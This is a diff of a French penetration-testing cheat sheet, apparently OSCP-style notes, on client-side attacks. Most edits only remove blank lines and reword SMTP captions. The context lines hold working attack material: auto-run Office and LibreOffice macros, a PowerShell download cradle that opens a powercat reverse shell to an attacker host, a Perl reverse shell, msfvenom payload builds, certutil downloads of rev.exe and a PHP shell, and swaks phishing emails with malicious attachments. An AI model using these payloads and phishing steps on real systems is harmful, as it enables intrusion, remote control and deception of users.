@@ -7,11 +7,7 @@ description: "Comprendre les vecteurs d'interaction avec les postes utilisateurs
 
 Comprendre les vecteurs d'interaction avec les postes utilisateurs.
 
-
 ## Macros Office
-
-
-
 
 ```text
 Sub AutoOpen()
@@ -27,7 +23,6 @@ Sub MyMacro()
 End Sub
 
 ```
-
 
 <p class="oscp-command-note">Macro VBA déclenchée à l'ouverture du document</p>
 
@@ -48,14 +43,10 @@ End Sub
 
 ```
 
-
-
-
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
 
 ```
-
 
 <p class="oscp-command-note">Macros Office : encoder une chaîne PowerShell au format Unicode Base64.</p>
 
@@ -65,7 +56,6 @@ $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
 Write-Output $encoded
 
 ```
-
 
 <p class="oscp-command-note">Python : découper une chaîne PowerShell encodée en fragments pour l'exemple de macro.</p>
 
@@ -78,9 +68,6 @@ for i in range(0, len(cmd_str), chunk_size):
     print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')
 
 ```
-
-
-
 
 <p class="oscp-command-note">Macro VBA déclenchée à l'ouverture du document</p>
 
@@ -106,8 +93,6 @@ End Sub
 
 ```
 
-
-
 ### Détecter les métadonnées OLE d'un document
 
 Oletools permet de relever les caractéristiques d'un fichier Office sans ouvrir les macros dans la suite bureautique.
@@ -123,14 +108,10 @@ olevba -a <DOCUMENT_OFFICE>
 
 Observer les permissions et la configuration de Windows.
 
-
-
-
 ```bash
 wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 
 ```
-
 
 <p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Fichiers de bibliothèque Windows».</p>
 
@@ -140,10 +121,8 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 
 ```
 
-
 **Paramètres et repères :**
 `.Library-ms`  
-
 
 <p class="oscp-command-note">Exemple de structure XML d’un fichier de bibliothèque Windows (`.library-ms`).</p>
 
@@ -170,8 +149,6 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 
 ```
 
-
-
 ### Inspecter la signature d'un exécutable
 
 Afficher l'état de la signature Authenticode d'un fichier Windows, sans le lancer.
@@ -183,9 +160,6 @@ Get-AuthenticodeSignature -FilePath '<CHEMIN_EXECUTABLE>' | Format-List
 ```
 
 ## Techniques complémentaires côté client
-
-
-
 
 ```text
 Sub AutoOpen()
@@ -204,7 +178,6 @@ Sub MyMacro()
 End Sub
 
 ```
-
 
 <p class="oscp-command-note">Macro VBA déclenchée à l'ouverture du document</p>
 
@@ -225,7 +198,6 @@ End Sub
 
 ```
 
-
 <p class="oscp-command-note">Script PowerShell pour l’exploitation avancée.</p>
 
 ```powershell
@@ -239,7 +211,6 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 
 ```
 
-
 ```html
 <script>
     var cmd = "[Your JavaScript Command]";
@@ -247,7 +218,6 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 </script>
 
 ```
-
 
 <p class="oscp-command-note">Exemple JavaScript pour l’exploitation avancée.</p>
 
@@ -259,7 +229,6 @@ eval(cmd);
 
 ```
 
-
 <p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>
 
 ```powershell
@@ -267,11 +236,9 @@ net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
 
 ```
 
-
 ### Courriel simple
 
-
-<p class="oscp-command-note">Examiner la configuration SMTP.</p>
+<p class="oscp-command-note">Vérifier les paramètres du serveur SMTP.</p>
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -280,16 +247,13 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 
 ```
 
-
 **Paramètres et repères :**
 `-t` · `--from` · `--attach` · `--server`  
 `--body` · `--header` · `--suppress-data`  
 
-
 ### Courriel avec authentification
 
-
-<p class="oscp-command-note">Examiner la configuration SMTP.</p>
+<p class="oscp-command-note">Vérifier les paramètres du serveur SMTP.</p>
 
 ```bash
 sudo swaks -t <recipient@example.com> --from <sender@example.com> \
@@ -299,20 +263,14 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>--auth LOGIN</code></p>
-
 
 **Paramètres et repères :**
 `--auth-user` · `--auth-password`  
 
-
 ### E-mail avec en-têtes personnalisés (ingénierie sociale)
 
-
-<p class="oscp-command-note">Examiner la configuration SMTP.</p>
+<p class="oscp-command-note">Vérifier les paramètres du serveur SMTP.</p>
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -321,15 +279,10 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 
 ```
 
-
 **Paramètres et repères :**
 `X-Priority` · `Importance`  
 
-
 ### Outils complémentaires d’envoi d’e-mails
-
-
-
 
 ```bash
 sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
@@ -337,44 +290,35 @@ sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
 
 ```
 
-
 **Paramètres et repères :**
 `sendemail` · `-f` · `-t` · `-s`  
 `192.168.203.140:25` · `-u` · `-m` · `-a`  
 
-
 ### Comparaison des méthodes
-
 
 **Authentification**
 
 No · Yes · No · No
 
-
 **En-têtes personnalisés**
 
 Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only
-
 
 **Authentification SMTP**
 
 No · Yes · No · No
 
-
 **Utilisation en ingénierie sociale**
 
 No · No · Yes (with custom headers) · No
-
 
 **Complexité de l’outil**
 
 Moderate · Moderate · Moderate · Simple
 
-
 ### Cibles Linux
 
 Examiner les permissions et la configuration de Linux.
-
 
 <p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
@@ -398,22 +342,12 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f elf</code></p>
-
-
-
 
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-o shell.elf</code></p>
 
-
 **Paramètres et repères :**
 `shell.elf`  
-
-
-
 
 <p class="oscp-command-note">Procédure VBA d'exécution</p>
 
@@ -429,7 +363,6 @@ End Sub
 
 ```
 
-
 <p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>
 
 ```bash
@@ -437,10 +370,8 @@ python3 -m http.server 80
 
 ```
 
-
 **Paramètres et repères :**
 `update.odt`  
-
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
@@ -449,12 +380,10 @@ nc -lvnp 4444
 
 ```
 
-
 **Paramètres et repères :**
 `swaks`  
 
-
-<p class="oscp-command-note">Examiner la configuration SMTP.</p>
+<p class="oscp-command-note">Vérifier les paramètres du serveur SMTP.</p>
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -470,11 +399,9 @@ swaks --to target@example.com --from emmanuel@example.com \
 
 ```
 
-
 ### Cibles Windows
 
 Observer les permissions et la configuration de Windows.
-
 
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
@@ -483,57 +410,33 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f hta-psh</code></p>
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-o evil.hta</code></p>
-
 
 **Paramètres et repères :**
 `evil.hta` · `.hta` · `msfvenom` · `ps1`  
 `exe`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f exe -o evil.exe</code></p>
-
 
 **Paramètres et repères :**
 `vbs`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f vbs -o evil.vbs</code></p>
-
 
 **Paramètres et repères :**
 `ps1`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f ps1 -o script.ps1</code></p>
-
 
 **Paramètres et repères :**
 `dll`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f dll -o payload.dll</code></p>
-
 
 **Paramètres et repères :**
 `evil.hta`  
-
 
 <p class="oscp-command-note">Python : découper une chaîne encodée en blocs de 50 caractères pour l'exemple Windows.</p>
 
@@ -548,45 +451,30 @@ for i in range(0, len(s), n):
 
 ```
 
-
 **Paramètres et repères :**
 `exploit.ods` · `Tools` · `Options` · `LibreOffice`  
 `Security`  
-
-
-
 
 ```text
 Macro Security
 
 ```
 
-
 **Paramètres et repères :**
 `Tools` · `Macros`  
-
-
-
 
 ```text
 Organize Macros
 
 ```
 
-
-
-
 ```text
 LibreOffice Basic
 
 ```
 
-
 **Paramètres et repères :**
 `Exploit`  
-
-
-
 
 <p class="oscp-command-note">Extrait de macro LibreOffice Basic</p>
 
@@ -604,51 +492,36 @@ End Sub
 
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;INSERT_YOUR_PAYLOAD_CHUNKS&gt;</code></p>
-
 
 **Paramètres et repères :**
 `-nop`  
-
-
-
 
 ```text
 -w hidden
 
 ```
 
-
 **Paramètres et repères :**
 `Shell`  
-
-
-
 
 ```text
 Shell Str, 1
 
 ```
-
 
 ```text
 Shell(Str)
 
 ```
 
-
 ```text
 Shell Str, 1
 
 ```
 
-
 **Paramètres et repères :**
 `Shell`  
-
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
@@ -657,8 +530,7 @@ nc -lvnp 444
 
 ```
 
-
-<p class="oscp-command-note">Examiner la configuration SMTP.</p>
+<p class="oscp-command-note">Vérifier les paramètres du serveur SMTP.</p>
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -669,10 +541,8 @@ swaks --to target@example.com --from emmanuel@example.com \
 
 ```
 
-
 **Paramètres et repères :**
 `exploit.ods`  
-
 
 <p class="oscp-command-note">Créer un pseudo-terminal interactif avec Python.</p>
 
@@ -680,7 +550,6 @@ swaks --to target@example.com --from emmanuel@example.com \
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ```
-
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
@@ -691,16 +560,12 @@ ipconfig /all
 
 ```
 
-
 <p class="oscp-command-note">Se placer dans le répertoire utilisé pour «Cibles Windows».</p>
 
 ```text
 cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
 
 ```
-
-
-
 
 #### Empreinte d'une pièce jointe
 
